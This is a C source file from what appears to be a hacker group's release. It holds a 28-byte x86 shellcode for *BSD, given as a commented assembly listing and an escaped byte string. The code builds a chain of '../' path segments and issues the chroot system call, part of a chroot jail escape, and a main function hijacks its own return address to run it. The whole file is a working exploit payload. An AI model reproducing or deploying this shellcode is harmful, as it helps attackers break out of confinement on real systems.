/* One of the smallest chroot shellcodes in the !!world!!
   it will put '../' 10 times
   Size  28 bytes
   OS	 *BSD
  		/rootteam/dev0id	(rootteam.void.ru)
			dev0id@uncompiled.com

BITS	32

	xor	ecx,ecx
	xor	eax,eax
	push	ecx
	mov	cl,0x1e
main_push:
	push byte 0x2e
	loop	main_push
	mov	cl,0x1e
main_loop:
	dec	cl
	inc byte [esp+ecx]
	dec	cl
	loop	main_loop
	push 	esp
	mov	al,0x3d
	push	eax
	int	0x80

*/
char shellcode[] =
	"\x31\xc9\x31\xc0\x51\xb1\x1e\x6a\x2e\xe2\xfc\xb1\x1e\xfe\xc9"
	"\xfe\x04\x0c\xfe\xc9\xe2\xf7\x54\xb0\x3d\x50\xcd\x80";

int
main(void)
{
	int *ret;
	ret = (int*)&ret + 2;
	(*ret) = shellcode;
}